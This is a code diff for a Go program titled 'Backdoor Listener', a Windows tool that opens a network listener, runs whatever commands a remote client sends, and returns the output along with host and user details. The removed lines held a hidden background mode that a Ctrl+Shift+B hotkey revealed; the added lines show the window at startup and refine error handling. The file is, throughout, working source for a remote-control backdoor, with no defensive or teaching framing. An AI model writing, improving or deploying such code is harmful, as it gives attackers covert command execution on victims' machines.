@@ -4,7 +4,6 @@ package main
 
 import (
 	"bufio"
-	"context"
 	"encoding/json"
 	"fmt"
 	"log"
@@ -18,7 +17,6 @@ import (
 
 	"github.com/lxn/walk"
 	. "github.com/lxn/walk/declarative"
-	"github.com/micmonay/keybd_event"
 )
 
 const (
@@ -28,7 +26,6 @@ const (
 )
 
 var (
-	listenerConn      net.Conn
 	mainWindow        *walk.MainWindow
 	addressLineEdit   *walk.LineEdit
 	portLineEdit      *walk.LineEdit
@@ -36,7 +33,6 @@ var (
 	logTextEdit       *walk.TextEdit
 	stopListener      chan struct{}
 	startListenerOnce sync.Once
-	kb                keybd_event.KeyBonding
 	uiVisible         bool
 	uiMutexLocal      sync.Mutex
 )
@@ -97,7 +93,13 @@ func getSysInfo() string {
 	osName := runtime.GOOS
 	arch := runtime.GOARCH
 	hostname, _ := os.Hostname()
-	username := "N/A"
+	username := os.Getenv("USERNAME")
+	if username == "" {
+		username = os.Getenv("USER")
+	}
+	if username == "" {
+		username = "N/A"
+	}
 	return fmt.Sprintf("OS: %s\nArchitecture: %s\nHostname: %s\nUsername: %s", osName, arch, hostname, username)
 }
 
@@ -108,7 +110,11 @@ func handleConnection(conn net.Conn) {
 	logMessage(fmt.Sprintf("Client connected: %s", conn.RemoteAddr()))
 
 	for {
-		command, _ := reader.ReadString('\n')
+		command, err := reader.ReadString('\n')
+		if err != nil {
+			logMessage(fmt.Sprintf("Error reading command: %v", err))
+			break
+		}
 		command = strings.TrimSpace(command)
 		if command == "quit" {
 			break
@@ -122,7 +128,7 @@ func handleConnection(conn net.Conn) {
 		} else if command != "" {
 			result = executeCommand(command)
 		}
-		_, err := writer.WriteString(result + "\n")
+		_, err = writer.WriteString(result + "\n")
 		writer.Flush()
 		if err != nil {
 			logMessage(fmt.Sprintf("Error sending response: %v", err))
@@ -168,7 +174,6 @@ func startListener(host, port string) {
 func stopListenerService() {
 	if stopListener != nil {
 		close(stopListener)
-		listenerConn = nil
 		logMessage("Stopping listener service...")
 		startListenerOnce = sync.Once{}
 	} else {
@@ -185,20 +190,19 @@ func connectButtonHandler() {
 }
 
 func logMessage(message string) {
-	if mainWindow != nil {
+	fmt.Printf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
+	
+	if mainWindow != nil && logTextEdit != nil {
 		mainWindow.Synchronize(func() {
-			if logTextEdit != nil {
-				logTextEdit.AppendText(fmt.Sprintf("[%s] %s\r\n", time.Now().Format("2006-01-02 15:04:05"), message))
-			}
+			logTextEdit.AppendText(fmt.Sprintf("[%s] %s\r\n", time.Now().Format("2006-01-02 15:04:05"), message))
 		})
 	}
-	log.Println(message)
 }
 
 func createUIWrapper(config Config) {
 	err := MainWindow{
 		Title:   "Backdoor Listener",
-		MinSize: Size{Width: 300, Height: 200},
+		MinSize: Size{Width: 400, Height: 300},
 		Layout:  VBox{},
 		Children: []Widget{
 			Composite{
@@ -213,21 +217,14 @@ func createUIWrapper(config Config) {
 			PushButton{
 				Text:      "Start Listener",
 				AssignTo:  &connectButton,
-				OnClicked: func() { connectButtonHandler() },
+				OnClicked: connectButtonHandler,
 			},
 			Label{Text: "Log:"},
 			TextEdit{
-				AssignTo:     &logTextEdit,
-				ReadOnly:     true,
-				VScroll:      true,
-				CompactHeight: false,
-			},
-		},
-		Events: Events{
-			Closing: func(canceled *bool, reason CloseReason) {
-				stopListenerService()
-				uiVisible = false
-				mainWindow = nil
+				AssignTo:           &logTextEdit,
+				ReadOnly:           true,
+				VScroll:            true,
+				AlwaysConsumeSpace: true,
 			},
 		},
 		AssignTo: &mainWindow,
@@ -237,9 +234,20 @@ func createUIWrapper(config Config) {
 		log.Fatal("UI creation failed:", err)
 	}
 
+	// Set up the close handler after creation
+	mainWindow.Closing().Attach(func(canceled *bool, reason walk.CloseReason) {
+		stopListenerService()
+		uiMutexLocal.Lock()
+		uiVisible = false
+		uiMutexLocal.Unlock()
+	})
+
+	uiVisible = true
 	mainWindow.Show()
 	mainWindow.Run()
 }
+
+// This function is removed as we're not using hotkeys in this simplified version
 
 func main() {
 	if runtime.GOOS != "windows" {
@@ -247,44 +255,18 @@ func main() {
 		return
 	}
 
-	var err error
-	kb, err = keybd_event.NewKeyBonding()
-	if err != nil {
-		log.Fatal("Error creating keybd instance:", err)
-	}
-
 	config := loadConfig()
 
-	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
-
-	go func() {
-		for {
-			select {
-			case <-ctx.Done():
-				return
-			default:
-				if kb.IsPressed(keybd_event.VK_CONTROL) &&
-					kb.IsPressed(keybd_event.VK_SHIFT) &&
-					kb.IsPressed(keybd_event.VK_B) {
-					uiMutexLocal.Lock()
-					if !uiVisible {
-						uiVisible = true
-						go createUIWrapper(config)
-					} else if mainWindow != nil {
-						mainWindow.Synchronize(func() {
-							mainWindow.Show()
-						})
-					}
-					uiMutexLocal.Unlock()
-					time.Sleep(time.Millisecond * 500)
-				}
-				time.Sleep(time.Millisecond * 100)
-			}
-		}
-	}()
-
-	log.Println("Backdoor listener running in the background. Press Ctrl+Shift+B to open UI.")
+	// Start listener service with the configuration
 	startListener(config.Host, config.Port)
-	select {}
+	
+	// Start UI - don't use goroutine for the UI
+	uiMutexLocal.Lock()
+	if !uiVisible {
+		uiVisible = true
+		uiMutexLocal.Unlock()
+		createUIWrapper(config) // This will block until the window is closed
+	} else {
+		uiMutexLocal.Unlock()
+	}
 }
